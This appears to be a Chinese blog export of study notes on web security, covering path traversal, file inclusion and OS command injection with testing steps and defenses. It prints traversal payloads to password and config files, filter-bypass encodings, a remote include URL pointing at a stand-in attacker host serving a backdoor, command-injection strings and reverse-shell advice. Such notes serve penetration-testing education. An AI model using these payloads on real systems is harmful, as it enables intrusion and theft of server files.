<p><strong><a href="http://mdsec.net/filestore/8/GetFile.ashx?filename=keira.jpg" target="_blank" rel="noopener">http://mdsec.net/filestore/8/GetFile.ashx?filename=keira.jpg</a></strong></p>
<p>当服务器处理这个请求时，它执行以下操作。</p>
<p>（1）从查询字符串中提取filename参数值</p>
<p>（2）将这个值附加在C:\filestore\之后</p>
<p>（3）用这个名称打开文件</p>
<p>（4）读取文件的内容，并将其返回客户端</p>
<p>漏洞之所以会发生，是因为攻击者可以将路径遍历序列放入文件名内，从第（2）步指定的图像目录向上回溯，从而访问服务器上的任何文件。众所周知，路径遍历序列表示为“点-点-斜线”（..\），一个典型攻击如下：</p>
<p><strong><a href="http://mdsec.net/filestore/8/GetFile.ashx?filename=..\windows.win.ini" target="_blank" rel="noopener">http://mdsec.net/filestore/8/GetFile.ashx?filename=..\windows.win.ini</a></strong></p>
<p>如果应用程序把filename参数的值附加到图像目录名称之后，就得到以下路径：</p>
<p><strong>C:\filestore..\windows\win.ini</strong></p>
<p>这两个遍历序列立即从图像目录回溯到C:驱动器根目录下，因此，前面的路径等同于以下路径：</p>
<p><strong>C:\windows\win.ini</strong></p>
<p>因此，服务器不会返回图像文件，而是返回默认的Windows配置文件。</p>
<h2 id="查找和利用路径遍历漏洞"><a href="#查找和利用路径遍历漏洞" class="headerlink" title="查找和利用路径遍历漏洞"></a>查找和利用路径遍历漏洞</h2><h3 id="确定攻击目标"><a href="#确定攻击目标" class="headerlink" title="确定攻击目标"></a>确定攻击目标</h3><p>在对应用程序进行初步解析的过程中，应该已经去定了素有与路径遍历漏洞有关的明显受攻击面。主要用于文件上传或下载目的地所有功能都应进行全面测试。用户可共享文档的工作流程应用程序，允许用户上传的图像的博客与拍卖应用程序，以及为用户提供电子书。技术手册和公司表表等文档的信息型应用程序，常常使用这种功能。</p>
<p>除这种明显的目标功能外，还有其他各种行为表示应用程序需要与文件系统进行交互。</p>
<ol>
<li>分析在应用程序解析过程中收集到的信息，确定以下内容。<ul>
<li>请求参数中明显包含文件或目录名称的所有情形。例如，include=main.inc或template=/en/sidebar</li>
<li>需要从服务器文件系统读取数据的所有应用程序功能。例如，显示办公文档或图像。</li>
</ul>
</li>
<li>在测试其他漏洞的过程中，寻找有益的错误消息或其他反常事件。设法确定用户提交的数据被传送给文件API或作为操作系统命令参数的所有情况。</li>
<li>如果能从本地访问应用程序，执行以下操作：<ul>
<li>使用适当的工具监控服务器上的所有文件系统活动</li>
<li>在每一个被提交的参数（包括全部cookie、查询字符串字段和POST数据项）中插入一个特殊的字符串测试应用程序的每一个页面。一次仅针对一个参数进行测试</li>
<li>在文件系统监控工具中设置一个过滤器，确定所有包含测试字符串的文件系统事件</li>
<li>如果发现测试字符串被用作文件或目录，或者出现在文件或目录名中，那么对于每一种情况进行测试，确定其是否收到路径遍历攻击。</li>
</ul>
</li>
</ol>
<h3 id="探查路径遍历漏洞"><a href="#探查路径遍历漏洞" class="headerlink" title="探查路径遍历漏洞"></a>探查路径遍历漏洞</h3><p>确定各种潜在的路径测试目标后，必须分别测试每种情况，弄清其是否以不安全的方式向相关文件操作系统传送用户可控制的数据。</p>
<p>在测试用户提交的参数时，需确定遍历序列是否被应用程序阻止，或者他们能够正常工作。通常，提交不会向上回溯到其实目录的遍历序列是一种较为可靠的初步测试方法。</p>
<ul>
<li><p>假设所针对的参数被附加到应用程序预先设定的目标之后，那么插入任意一个子目录和一个遍历序列，修改参数的值。例如，应用程序提交参数</p>
<p><strong>foo=foo/file1.txt</strong></p>
<p>那么可以尝试提交以下值：</p>
<p><strong>foo=foo/bar/../file1.txt</strong></p>
<p>如果两种情况下应用程序的行为完全相同，就表示它易于受到攻击。应该继续测试，尝试通过向上回溯到起始目录来访问不同的文件。</p>
</li>
<li><p>在上述两种情况下，如果应用程序的行为有所不同，那么应用程序可能阻止、删除或净化遍历序列，致使文件路径失效。</p>
<p>即使子目录“bar”并不存在，这个测试仍然有效，因为大多数文件系统在尝试获取文件路径前对其进行了规范化。路径序列删除了虚构的目录，因此服务器并不检查它是否存在。</p>
</li>
</ul>
<p>如果的发现提交遍历序列但不向上回溯至起始目录不会影响应用程序的行为，那么就写来的测试中，应该尝试遍历出起始目录，从服务器文件系统的其他地方访问文件。</p>
<ul>
<li><p>如果所攻击的应用程序功能只拥有文件读取访问权限，那么尝试访问相关操作系统上的一个一致任何用户均可读取的文件。提交下面其中一个值作为受控制的文件名参数：</p>
<p><strong>../../../../../../../../../../../../../etc/password</strong></p>
<p><strong>../../../../../../../../../../../windows/win.ini</strong></p>
</li>
<li><p>如果所攻击的功能拥有文件写入访问权限，那么要最终确定应用程序是否易于受到攻击，可能会更困难。通常，一种有效的测试是尝试写入两个文件，一个文件可被任何用户写入，另一个文件即使是跟用户或管理员也禁止写入。例如，在windows平台上可以尝试写入下面两个文件：</p>
<p><strong>../../../../../../../../../../../tmp/writest.txt</strong></p>
<p><strong>../../../../../../../../../../../../tmp</strong></p>
<p>在上面的每对测试中，如果应用程序在响应两个请求时表现出行为差异，那么应用程序可能易于受到攻击。</p>
</li>
<li><p>还有一种方法可通过写入访问确定遍历漏洞，即尝试在Web服务器的Web根目录中写入一个新文件，然后同时通过浏览器获得这个文件。但是，如果并不知道Web根目录的位置，或者访问文件的用户并不拥有写入权限，这种方法可能不会成功。</p>
</li>
</ul>
<h3 id="避开路径攻击障碍"><a href="#避开路径攻击障碍" class="headerlink" title="避开路径攻击障碍"></a>避开路径攻击障碍</h3><p>最初的遍历尝试攻击并未成功，并不意味着应用程序不容易受到攻击。许多应用程序开发者意识到路径遍历漏洞，并执行各种输入确认检查尝试防止这种漏洞。但是，这些防御措施往往存在缺陷，可被技术熟练的攻击者轻易避开。</p>
<p>第一种常见的输入过滤方法如下，首先检查文件名参数中是否存在任何路径遍历序列，如果存在，要么拒绝包含遍历序列的请求，要么尝试删除该序列，以对输入进行净化。这种类型过滤往往易于受到各种攻击，它们使用编码或其他方法来避开过滤。这类攻击全都利用输入确认机制所面临的规范化问题。</p>
<ul>
<li><p>尝试始终通过使用斜线与反斜线的路径遍历序列进行测试。许多输入过滤仅检查其中一种序列，而文件系统却支持全部两种序列。</p>
</li>
<li><p>尝试使用下面的编码方案，对遍历序列进行简单的URL编码。一定要多输入中的每一个斜线和点进行编码：</p>
<ul>
<li>点——%2e</li>
<li>斜线——%2f</li>
<li>反斜线——%5c</li>
</ul>
</li>
<li><p>尝试使用下面的16位Unicode编码：</p>
<ul>
<li>点——%u002e</li>
<li>斜线——%u2215</li>
<li>反斜线——%u2216</li>
</ul>
</li>
<li><p>尝试使用下面的双倍URL编码：</p>
<ul>
<li>点——%252e</li>
<li>斜线——%252f</li>
<li>反斜线——%255c</li>
</ul>
</li>
<li><p>尝试使用下面的超长UTF-8 unicode编码：</p>
<ul>
<li>点——%c%2e、%e0%40%ae、%c0ae等</li>
<li>斜线——%c0%af、%e0%80%af、%c0%2f等</li>
<li>反斜线——%c0%5c、%c0%80%5c等</li>
</ul>
<p>可以在Burp Intruder中使用非法Unicode有效载荷类型为任何特殊字符生成大量其他形式的表示法，并将它提交到目标参数的相关位置。这些表示法严重违反了Unicode表示法规则，但却为许多Unicode解码器接受，特别是Windows平台上的解码器。</p>
</li>
<li><p>如果应用程序尝试通过删除遍历序列来净化用户输入，但没有以递归的方式应用这种过滤，那么可以用一个序列来替换另一个序列来避开过滤。例如：</p>
<ul>
<li><strong>….//</strong></li>
<li><strong>…./\</strong></li>
<li><strong>….\\</strong></li>
</ul>
</li>
</ul>
<p>第二种防御路径遍历攻击时常用的输入过滤，就是确认用户提交的输入是否包含应用程序想要的后缀或前缀。这种类型的防御可以与前面描述的过滤联合使用。</p>
<ul>
<li><p>一些应用程序检查用户提交的文件是否以一种或特殊的文件类型结尾，并决绝访问其他内容的请求，有时候，可以在请求的文件名后放入一个URL编码的空字节，在后面连接应用程序接受的文件类型，从而避开这种检查。例如：</p>
<p><strong>../../../../../boot.ini%00.jpg</strong></p>
<p>这种攻击有时会成功，是因为应用程序使用API在托管执行环境下执行文件类型检查，该执行环境允许字符串包含空字符。但是，当获取文件时，应用程序最终在一个无法控制的环境中使用API，因此文件名被截短为想要的值。</p>
</li>
<li><p>一些应用程序将它们自己的文件类型后缀附加在用户提交的文件名后，尝试控制被访问的文件类型。在这种情况下，基于相同的原因，前面的任何一种利用都可能取得成功。</p>
</li>
<li><p>一些应用程序检查用户提交的文件名的开头部分是否为起始目录的某一个子目录，或者一个特殊的文件名。当然，通过以下方法可轻易避开这种检查：</p>
<p><strong>filestore/../../../../../../../etc/password</strong></p>
</li>
<li><p>如果以上针对输入过滤的攻击都无法成功，可能应用程序实施了几种类型的过滤，因此需要同时使用上面的几种攻击方法。遇到这种情况，如有可能，最好的方法是将问题分解成几个独立的阶段。例如，如果请求</p>
<p>diagram1.jpg</p>
<p>能够成功，但请求</p>
<p>foo/../diagram1.jpg</p>
<p>却导致失败，那么尝试使用所有可能的遍历序列，知道第二个请求获得成功。如果使用这些成功的遍历序列仍然无法访问/etc/password，就请求一下文件，检查应用程序是否实施任何文件类型过滤，以及是否可以避开这种过滤：</p>
<p>diagram1.jpg%00.jpg</p>
<p>彻底检查应用程序定义的起始目录，设法了解它实施的全部过滤，看是否可以利用上述技巧避开每一种过滤。</p>
</li>
<li><p>当然，如果能够随意访问应用程序，那么攻击就变得简单，因为渗透测试员可以系统性地攻击每种输入，并确定最终通过哪些文件名可以到达文件系统。</p>
</li>
</ul>
<h3 id="处理定制编码"><a href="#处理定制编码" class="headerlink" title="处理定制编码"></a>处理定制编码</h3><p>应用程序采用的文件名编码方案最终以危险的方式进行处理，模糊处理也不能提供任何安全保障，这时就会出现最为可怕的路径遍历漏洞。</p>
<p>例如，一些应用程序具有某种工作流程功能，允许用户上传下载文件，执行上传操作的请求提供一个文件名参数，它在写入文件时易于受到路径遍历攻击。如果一个文件成功上传，那么应用程序再为用户提供一个下载URL。这里有两点值得注意：</p>
<ul>
<li>应用程序核对将要写入的文件是否已经存在，如果存在，就拒绝重写这个文件。</li>
<li>为下载用户文件而生成的URL使用一种定制模糊处理方案表示。这种方案似乎是一种定制的Base64编码形式，它在每个编码文件名位置使用一组不同的字符。</li>
</ul>
<p>总的来说，这些注意点给直接利用漏洞设置了障碍。首先，尽管能够给在服务器文件系统中写入任何文件，但攻击者无法重写任何现有文件，而且，Web服务器进程有用较低权限意味着攻击者不可能在任何有力位置创建新文件。其次，如果不对定制编码进行逆向工程，攻击者也不可能请求任意一个现有的文件。</p>
<h3 id="利用遍历漏洞"><a href="#利用遍历漏洞" class="headerlink" title="利用遍历漏洞"></a>利用遍历漏洞</h3><p>可以利用读取访问路径遍历漏洞从包含有用信息的服务器上获取有益的文件，或者帮助优化针对其他漏洞的攻击，如下所示。</p>
<ul>
<li>操作系统与应用程序的密码文件</li>
<li>服务器与应用程序配置文件，以发现其他漏洞或优化另一次攻击</li>
<li>可能含有数据库帧数的包含文件</li>
<li>应用程序使用的数据源，如MySQL数据库文件或XML文件</li>
<li>服务器可执行页面的源代码，以执行代码审查，搜索漏洞</li>
<li>可能包含用户名和会话令牌的应用程序日志文件等</li>
</ul>
<p>如果发现一个允许写入访问的路径遍历漏洞，那么渗透测试的主要目标应该是利用它在服务器上执行任意命令。利用漏洞实现这一目标的方法包括以下几种：</p>
<ul>
<li>在用户的启动文件夹中创建脚本</li>
<li>当用户下一次连接时，修改in.ftpd等文件执行任意命令</li>
</ul>
<p>向一个拥有执行许可的Web目录写入脚本，从浏览器调用它们。</p>
<h2 id="防止路径遍历漏洞"><a href="#防止路径遍历漏洞" class="headerlink" title="防止路径遍历漏洞"></a>防止路径遍历漏洞</h2><p>迄今为止，避免向任何文件系统API传送用户提交的数据时防止路径遍历漏洞的最有效方法。许多时候，包含在最初的GetIFile.aspx?filename=keira.jpg示例中，应用程序完全没有必要实施防御。因为大多数文件都没有采用访问控制，攻击者可以将这些文件存入Web根目录中，再通过URL直接访问。如果以上方法行不通，应用程序可能会保存一个可由页面处理的硬编码图像文件列表，并使用不同的标识符指定需要的文件。任何包含无效标识符的请求都可能遭到拒绝，因为没有受攻击面可供用户利用，使其操纵页面提供的文件路径。</p>
<p>有时，与实现文件上传与下载的工作流程一样，应用程序可能需要允许用户通过名称指定文件，这时，开发者可能采用最简单的方法，将用户提交的用户名传送给文件系统API。从而达到这种目的。在这种情况下，应用程序应实施深层防御措施，为路径遍历攻击设立几层障碍。</p>
<p>以下是一些可能有用的防御方法，在应用过程中，最好将它们组合在一起使用。</p>
<ul>
<li>对用户提交的文件名进行相关解码与规范化之后，应用程序应检查该文件名是否包含路径遍历序列（使用反斜线或斜线）或孔子杰。如果是这样，应用程序应停止处理请求，不得尝试对恶意文件名进行任何净化处理。</li>
<li>应用程序应使用一个硬编码的。允许访问的文件类型列表，并决绝任何访问其他文件类型的请求（完成上述解码与规范化之后）。</li>
<li>对用户提交的文件名进行一切必要的过滤后，应用程序应使用适当的文件系统API确认是否一切正常，以及使用该文件名访问的文件是否位于应用程序指定的起始目录中。</li>
</ul>
<p>应用程序可以使用一个chrooted环境访问包含被访问文件的目录，减轻大多数路径遍历漏洞造成的影响。在这种情况下，chrooted目录就好比是文件系统的根目录，任何视图从这个目录向上回溯的多余遍历请求都被忽略。大多数UNIX平台支持chrooted文件系统。在Windows平台上，以新逻辑驱动器形式安装相关起始目录，并且使用响应的驱动器字母访问目录内容，即可实现类似的效果。</p>
<p>应用程序应将其路径遍历攻击防御机制与日志和警报机制整合在一起。任何时候，只要收到一个包含路径遍历序列的请求，提出请求的用户就可能心存恶意，应用程序应在日志中进行记录，表明该请求企图违反安全机制，并终止该用户的会话。如有可能，应冻结该用户账户并向管理员发出警报。</p>
<h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><p>许多脚本语言支持使用包含文件（include file）。这种功能允许开发者把可重复使用的代码插入到单个的文件中，并在需要时将它们包含在特殊功能的代码文件中。然后，包含文件中的代码被解释，就好像它插入到包含指令的位置一样。</p>
<h2 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h2><p>PHP语言特别容易出现文件包含漏洞，因为它的包含函数接受远程文件路径。这种缺陷已经成为PHP应用程序中大量漏洞的根源。</p>
<p>以一个想不通位置的人们传送各种内容的应用程序为例。用户选择他们的位置后，这个信息通过一个请求参数传送给服务器，代码如下：</p>
<p><strong><a href="https://wahh-app.com/main.php?Country=US" target="_blank" rel="noopener">https://wahh-app.com/main.php?Country=US</a></strong></p>
<p>应用程序通过以下方式处理Country参数：</p>
<p><strong>$country = $_GET[‘Country’]</strong></p>
<p><strong>include($country . ‘.php’)</strong></p>
<p>这使执行环境加载位于Web服务器文件系统中的US.php文件。然后，这个文件的内容被复制到main.php中并得以执行。</p>
<p>攻击者能够以各种方式利用这种行为，最严重的情况是指定一个外部URL作为包含文件的位置。PHP包含函数接受这个位置作为输入，接着，执行环境将获取指定的文件并制定其内容。因此，攻击者能够构建一个包含任意复杂内容的恶意脚本，将其及存在他控制的Web服务器上，并通过易受攻击的应用程序函数调用它然后执行。例如：</p>
<p><strong><a href="https://wahh-app.com/main.php?Country=http://wahh-attacker.com/backdoor" target="_blank" rel="noopener">https://wahh-app.com/main.php?Country=http://wahh-attacker.com/backdoor</a></strong></p>
<h2 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h2><p>有时，应用程序根据用户可控制的数据加载包含文件，但这是不可能给位于外部服务器上的文件制定URL。例如，用户可控制的数据被提交给ASP函数Server.execute，那么攻击者就可以执行任意一段ASP脚本，只要这段脚本属于调用这个函数的相同应用程序。</p>
<p>在这种情况下，攻击者仍然可以利用应用程序的行为执行未授权的操作。</p>
<ul>
<li>在服务器上可能有一些通过正常途径无法访问的路径，例如，任何访问路径/admin的请求都会被应用程序实施的访问控制阻止。如果能够将敏感功能包含在一个授权访问的页面中，那么就可以访问那个功能。</li>
<li>服务器上的一些静态资源也受到同样的保护，无法直接访问。如果能够将这些文件攻台包含在其他应用程序页面中，那么执行环境就会将静态资源的内容复制到它的响应中。</li>
</ul>
<h2 id="查找文件包含漏洞"><a href="#查找文件包含漏洞" class="headerlink" title="查找文件包含漏洞"></a>查找文件包含漏洞</h2><p>任何用户提交的数据项都可能因此文件包含漏洞。它们经常出现在指定一种语言或一个位置的请求参数中，也常常发生在以参数形式传送服务器端文件名的情况下。</p>
<p>要测试远程文件包含漏洞，执行以下步骤：</p>
<ol>
<li>向每一个目标参数提交一个连接受控制的Web服务器资源的URL，并确定是否收到运行目标应用程序的服务器提出任何请求。</li>
<li>如果第一次测试失败，尝试提交一个包含不存在的IP地址的URL，并确定服务器视图与这个地址建立连接时是否出现超时。</li>
<li>如果发现应用程序易于受到远程文件包含攻击，与前面描述的动态执行攻击中一样，使用相关语言中的可用API，弓箭一段恶意脚本实施攻击。</li>
</ol>
<p>相对于远程文件包含而言，存在本地文件包含漏洞的脚本环境要多一些。要测试本地文件包含漏洞，执行以下步骤：</p>
<ol>
<li>提交服务器上一个已知可执行资源的名称，确定应用程序的行为是否有任何变化</li>
<li>提交服务器上一个已知静态资源的名称，确定它的内容是否被复制到应用程序的响应中。</li>
<li>如果应用程序易于受到本地文件包含攻击，尝试通过Web服务器访问任何无法直接到达的敏感功能或资源</li>
<li>测试能够利用之前讲到的遍历技巧访问其他目录中的文件。</li>
</ol>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>Web</tag>
        <tag>注入</tag>
        <tag>文件路径</tag>
      </tags>
  </entry>
  <entry>
    <title>注入操作系统命令</title>
    <url>/2019/03/26/%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/5-1-%E6%B3%A8%E5%85%A5OS%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<h1 id="注入操作系统命令"><a href="#注入操作系统命令" class="headerlink" title="注入操作系统命令"></a>注入操作系统命令</h1><p>大多数Web服务器平台发展迅速，现在它们已经能够使用内置的API与服务器的操作系统进行几乎任何必须的交互。如果正确使用，这些API可帮助开发者访问文件系统、连接其他进程、进行安全的网络通信。但是，许多时候，开发者选择使用更高级的技术直接向服务器发送操作系统的命令。由于这些技术功能强大、操作简单，并且通常能够立即解决特定的问题，因而具有很强的吸引力。但是，如果应用程序向操作系统命令传送用户提交的输入，那么就可能会受到命令注入攻击，由此攻击者能够提交专门设计的输入，修改开发者想要执行的命令。</p>
<p>长用户发出操作系统命令的函数，如PHP中的exec和ASP中的wscript.shell函数，通常并不限制命令的可执行范围。即使开发者准备使用API执行相对善意的任务，例如，列出目录的内容，攻击者还是可以对其进行暗中破坏，从而写入任意文件或启动其他程序。通常，所有的注入命令都可在Web服务器的进程中安全运行，它具有足够强大的功能，使得攻击者能够完全控制整个服务器。</p>
<p>许多非定制和定制Web应用程序中都存在这种命令注入缺陷。在为企业服务器或防火墙、打印机和路由器之类的设备提供管理界面的应用程序中，这种缺陷尤为普遍。通常，由于这类程序由于操作系统交互的特殊需求，导致开发者直接使用合并了用户提交的数据的系统命令。</p>
<h2 id="通过Perl注入"><a href="#通过Perl注入" class="headerlink" title="通过Perl注入"></a>通过Perl注入</h2><p>以下面的Perl CGI代码为例，它是一个用于服务器管理的Web应用程序代码的一部分。这项功能允许管理员在服务器上指定一个目录，并查看它的磁盘使用情况：</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/perl</span></span><br><span class="line"><span class="keyword">use</span> strict;</span><br><span class="line"><span class="keyword">use</span> CGI <span class="string">qw(:standard escapeHTML)</span></span><br><span class="line"><span class="keyword">print</span> header, start_html(<span class="string">""</span>);</span><br><span class="line"><span class="keyword">print</span> <span class="string">"&lt;pre&gt;"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> $command = <span class="string">"du -h --exclude php* /var/www/html"</span></span><br><span class="line">$command=$command.param(<span class="string">"dir"</span>);</span><br><span class="line">$command=<span class="string">`$command`</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"$command\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> end_html;</span><br></pre></td></tr></table></figure>

<p>如果按设想的方式运行，这段脚本将把用户提交的dir参数值附加在预先设定的命令后面，执行命令并显示结果。</p>
<p>然而，通过提交专门设计的、包含shell元字符的输入，攻击者可对这项功能进行各种方式的利用。对处理命令的解释器而言，这些字符有着特殊的含义，并可破坏开发者想要执行的命令。例如，管道符“|”可用于将一个进程的输入重定向为另一个进程的输入，从而将几个命令连接在一起。攻击者可以利用这种行为注入另外一个命令并获得输出结果。</p>
<h2 id="通过ASP注入"><a href="#通过ASP注入" class="headerlink" title="通过ASP注入"></a>通过ASP注入</h2><p>以下面的C#代码为例，它是一个用于管理Web服务器的Web应用程序代码部分。该功能允许管理员查看被请求的目录和内容。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">String dirName &#x3D; &quot;C:\\filestore\\&quot; + Directory.Text;</span><br><span class="line">ProcessStartInfo psInfo &#x3D; new ProcessStartInfo(&quot;cmd&quot;, &quot;&#x2F;c dir &quot; + dirName);</span><br><span class="line">...</span><br><span class="line">Process proc &#x3D; Process.Start(psInfo);</span><br></pre></td></tr></table></figure>

<p>如果按设想的方式运行，这段脚本将把用户提交的Directory参数值插入到预先设定的命令中，执行命令并显示结果。</p>
<p>和前面易受攻击的Perl脚本一样，攻击者可以使用shell元字符破坏开发者预先设定的命令，并注入他自己的命令。&amp;字符用于将几个命令组合在一起。提交一个包含&amp;字符的文件名和另外一个命令就可以执行该命令并显示器结果。</p>
<h2 id="通过动态执行注入"><a href="#通过动态执行注入" class="headerlink" title="通过动态执行注入"></a>通过动态执行注入</h2><p>许多Web脚本语言支持动态执行在运行时生成的代码。这种特性允许开发者创建可根据各种数据和条件攻台修改其代码的应用程序。如果用户输入合并到可动态执行的代码中，那么攻击者就可以提交专门设计的输入，破坏原有数据，指定服务器执行自己的命令，就好像这些命令是由最初开发者编写的一样。这时，攻击者的第一个目标通常是注入运行操作系统命令的API。</p>
<p>PHP函数eval可用于动态执行在运行时传送给该函数的代码。下面以一个搜索功能为例，该动能允许用户创建保存的搜索，然后在用户界面上以链接的形式丰台生成这些搜索。用户使用下面的URL访问该搜索功能：</p>
<p><strong>/search.php?storedsearch=\$mysearch%3dwahh</strong></p>
<p>服务器端应用程序通过动态生成变量来执行这项功能，生成的变量包含在storedsearch参数中指定的名/值对；此处，它创建值为wahh的变量mysearch。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$storedsearch = $_GET[<span class="string">'storedsearch'</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"$storedsearch"</span>);</span><br></pre></td></tr></table></figure>

<p>这时，就可以提交专门设计的输入，由eval函数动态执行，从而在服务器端应用程序中注入任意PHP命令。分号字符可用于在单独一个参数中将几个命令连接在一起。例如，要检索文件/etc/password,keyi shiyong file_get_contents命令或system命令：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/search.php?storedsearch=\$mysearch%<span class="number">3</span>dwahh;%<span class="number">20</span><span class="keyword">echo</span>%<span class="number">20</span>file_get_contents(<span class="string">'/etc/password'</span>)</span><br><span class="line">/search.php?storedsearch=\$mysearch%<span class="number">3</span>dwahh;%<span class="number">20</span><span class="keyword">echo</span>%<span class="number">20</span>file_get_contents(<span class="string">'cat%20/etc/password'</span>)</span><br></pre></td></tr></table></figure>

<h2 id="查找OS命令注入漏洞"><a href="#查找OS命令注入漏洞" class="headerlink" title="查找OS命令注入漏洞"></a>查找OS命令注入漏洞</h2><p>不同的命令解释器处理shell元字符的方式各不相同。理论上，任何类型的应用程序开发平台或Web服务器可能会调用任何shell解释器，在它自己或任何其他主机的操作系统上运行。因此，不应根据对Web服务器操作系统的了解，对应用程序如何处理元数据做出任何假设。</p>
<p>有两种类型的元字符可用于在一个现有的预先设定的命令中注入一个独立的命令。</p>
<ul>
<li>字符 ; | &amp; 和换行符可用于将几个命令逐个连接在一起。有些时候，可以承兑使用这些字符以达到不同的效果。例如，在Windows命令解释器中，使用&amp;&amp;则第二个命令只有在第一个命令成功执行后才会运行。使用 ||  则总运行第二个命令，无论第一个命令是否成功执行。</li>
<li>反引号（`）用于讲一个独立的命令包含在最初的命令处理的数据中。把一个注入的命令放在反引号内shell解释器就会执行该命令，并用这个命令的结果代替被包含的文本，然后继续执行得到的命令字符串。</li>
</ul>
<p>通常，检测命令注入是否可行的最可靠方法就是使用时间延迟推断，类似于前面描述的利用盲目SQL注入时使用的方法。如果一个潜在的漏洞可能存在，那么就可以使用其他方法确定这个漏洞，并获得注入命令的执行结果。</p>
<ol>
<li><p>通常可以使用PING命令让服务器在一段时间内检测它的回环接口，从而触发时间延迟。Windows和Unix平台在处理命令分隔符与PING命令方面存在一些细微的差别，但是，如果没有设置过滤，下面的通用测试字符串应该能够在两个平台上引起30秒的时间延迟。</p>
<p><strong>|| ping -i 30 127.0.0.1 ; x || ping -n 30 127.0.0.1 &amp;</strong></p>
<p>如果应用程序过滤掉某些命令的分隔符，为加大监测到命令注入漏洞的可能性，还应轮流向每一个目标参数提交下面的每个测试字符串，并监控应用程序进行响应的时间。</p>
<p><strong>| ping -i 30 127.0.0.1 |</strong></p>
<p><strong>| ping -n 30 127.0.0.1 |</strong></p>
<p><strong>&amp; ping -i 30 127.0.0.1 &amp;</strong></p>
<p><strong>&amp; ping -n 30 127.0.0.1 &amp;</strong></p>
<p><strong>; ping -i 30 127.0.0.1 ;</strong></p>
<p><strong>%0a ping -i 30 127.0.0.1 %0a</strong></p>
<p><strong>‘ ping 127.0.0.1 ‘</strong></p>
</li>
<li><p>如果发生时间延迟，说明应用程序可能易于受到命令注入攻击。重复几次测试过程，确定延迟不是由于网络延时或其他异常造成的。可以尝试更改-n或-i的参数的值，并确定经历的时间延迟是否会随着提交的值发生对应的变化。</p>
</li>
<li><p>使用所发现的任何一个可成功实施攻击的注入字符串，尝试注入另一个更有用的命令（如ls或dir），确定是否能够将命令结果返回到浏览器上。</p>
</li>
<li><p>如果不能直接获得命令执行结果，还可以采用其他方法：</p>
<ul>
<li>可以尝试打开一条通向自己计算机的带外通道。尝试使用TFTP上传工具至服务器，使用telnet或netcat建立一个通向自己计算机的反向shell，并使用main命令通过SMTP发送命令结果。</li>
<li>可以将命令结果重定向到Web根目录下的一个文件，然后使用浏览器直接获取结果。</li>
</ul>
<p><strong>dir &gt; C:\inetpub\wwwroot\foo.txt</strong></p>
</li>
</ol>
<p>有时，由于某些字符被过滤掉，或者应用程序所使用的的命令的API的特殊行为，可能无法注入一个完全独立的命令。但是，攻击者仍然可以破坏所执行的命令的行为，得到想要的结果。</p>
<h2 id="查找动态执行漏洞"><a href="#查找动态执行漏洞" class="headerlink" title="查找动态执行漏洞"></a>查找动态执行漏洞</h2><p>动态执行漏洞最常见于PHP和Perl等语言。但基本上，任何应用程序平台都可能会向基于脚本的解释器传送用户提交的输入。</p>
<ol>
<li>用户提交的所有数据项都可提交给动态执行函数。其中最常见的数据项是cookie参数名称和参数值，以及作为前一项操作结果保存在用户资料中的永久数据。</li>
<li>尝试轮流项目表参数提交下列值：</li>
</ol>
<ul>
<li><strong>;echo%20111111</strong></li>
<li><strong>echo%201111111</strong></li>
<li><strong>response.write%20111111</strong></li>
<li><strong>:response.write%20111111</strong></li>
</ul>
<ol start="3">
<li>监控应用程序的响应。如果字符串111111被单独返回，就表示应用程序可能易于受到脚本命令注入。</li>
<li>如果字符串111111并未返回，寻找任何表示输入被动态执行的错误消息；另外，可能需要对语法进行调整，以实现注入任意命令的目的。</li>
<li>如果攻击的应用程序使用PHP，可以使用测试字符串phpinfo()。如果它成功执行，应用程序将返回PHP环境的配置信息。</li>
<li>如果应用程序可能易于受到攻击，与前面描述的查找OS命令注入漏洞时一样，注入一些造成时间延迟的命令确认这一点。例如：</li>
</ol>
<p><strong>system(‘ping%20127.0.0.1’)</strong></p>
<h2 id="防止OS命令注入"><a href="#防止OS命令注入" class="headerlink" title="防止OS命令注入"></a>防止OS命令注入</h2><p>通常来说，防止OS命令注入漏洞的最佳方法是完全避免直接调用操作系统命令。几乎Web应用程序所需要执行的每个任务都可以使用内置API完成，而且攻击者无法控制这些API，使其执行其他预料之外的命令。</p>
<p>如果无法避免要在传送给操作系统命令解释器的命令字符串中插入用户提交的数据，应用程序应实施严格的防御来防止漏洞发生。如果可能，应使用一份“白名单”限制用户只输入一组特殊的值。或者，应将输入范围限制为少数字符，例如，仅字母数字字符。应拒绝包含任何其他数据（包含任何元字符或空白符）的输入。</p>
<p>应用程序应使用命令API通过它的名称和命令行参数启动特殊的进程，而不是想支持命令链接与重定向的shell解释器传送命令字符串，从而实施另一层保护。</p>
<h2 id="防止脚本注入漏洞"><a href="#防止脚本注入漏洞" class="headerlink" title="防止脚本注入漏洞"></a>防止脚本注入漏洞</h2><p>通常而言，防止脚本注入漏洞的最佳方法是，避免将用户提交的输入或者来自用户的数据传送给任何动态执行或包含函数。如果由于某种原因必须传送用户提交的输入，那么应对相关输入进行严格的确认检查以组织任何攻击。如有可能，使用一份由已知可靠的值组成的“白名单”，并拒绝任何没有出现在这个名单上的输入。如果无法做到这一点，应根据一组已知无害的字符[如字母数字字符（空白符除外）]检查再输入中使用的字符。</p>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>Web</tag>
        <tag>注入</tag>
        <tag>操作系统命令</tag>
      </tags>
  </entry>
  <entry>
    <title>注入后端HTTP请求</title>
